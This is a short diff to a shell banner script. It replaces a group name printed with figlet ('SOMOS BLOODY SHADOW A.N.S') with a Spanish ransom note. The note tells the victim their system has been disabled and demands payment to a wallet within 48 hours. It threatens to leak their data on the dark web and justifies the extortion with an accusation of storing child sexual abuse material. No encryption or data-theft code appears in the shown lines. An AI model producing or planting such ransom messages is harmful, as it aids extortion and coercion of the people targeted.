@@ -8,6 +8,6 @@ PS1='\$ '
 
 echo "========================"
 
-figlet SOMOS BLOODY SHADOW A.N.S
+figlet -t -k -r Te preguntaras que ha pasado? Te he dejado inutil tu sistema, tienes que pagar a esta wallet si quieres recuperarlo, si no pagas en el plazo de 48 horas, toda tu información se filtrara en la DarkWeb. Asi aprenderas a no almacenar pornografia infantil en tu ordenador.
 
 echo "========================"
